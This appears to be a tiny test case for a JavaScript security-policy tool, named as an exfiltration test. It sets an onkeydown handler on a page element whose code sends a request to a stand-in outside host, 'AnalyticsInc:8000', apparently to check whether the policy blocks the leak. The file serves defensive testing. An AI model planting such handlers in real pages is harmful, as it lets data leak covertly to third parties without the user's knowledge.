// exfil_test_onkeydown1.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeydown1", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
JAM.call(v0.setAttribute, v0, ["onkeydown", exp], JAM.policy.p1)

